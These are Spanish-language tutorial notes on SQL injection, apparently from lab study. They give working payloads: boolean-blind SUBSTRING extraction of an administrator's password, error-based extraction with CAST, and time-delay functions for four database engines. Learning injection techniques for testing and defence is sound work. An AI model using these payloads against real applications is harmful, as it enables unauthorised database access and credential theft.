Paso 4: Iterar Todas las Posiciones

Uso de SUBSTRING con respuestas condicionales (2)

usamos esta función cuando queremos ir obteniendo los valores de la string que retorna una consulta en SQL, uno por uno. Hacemos uso de respuesta condicionales ya que igualamos el resultado de la consulta a algo para saber si es igual o no a eso.

La metodología es simple:

> 1-Buscamos una query de la cual queremos saber el valor que retorna y la concatenamos a la query del servidor con and

> 2-Le pasamos la query a la función LENGTH para saber la longitud de la cadena de respuesta

>3 - Le pasamos esa query como string a la función SUBSTRING()

>3- vamos iterando por posiciones y valores hasta obtener el valor completo del resultado de la consulta

ej:

' AND (SELECT SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))='a'--

Visible Errors-Based

En lugar de depender de "error vs no error" como en el método ciego, aquí convertimos los datos en parte del mensaje de error mismo.

Usamos CAST() para convertir un tipo de dato a otro y que se muestre el Error en Pantalla

' AND 1=CAST((#query) as int)--

' AND 1 = CAST((SELECT password FROM users LIMIT 1) as int)

Delays-Based

Esta es la forma en que podemos provocar un delay en las distintas bases de datos:

Oracle:dbms_pipe.receive_message(('a'),10)

Microsoft WAITFOR DELAY '0:0:10'

PostgreSQL SELECT pg_sleep(10)

MySQL SELECT SLEEP(10)
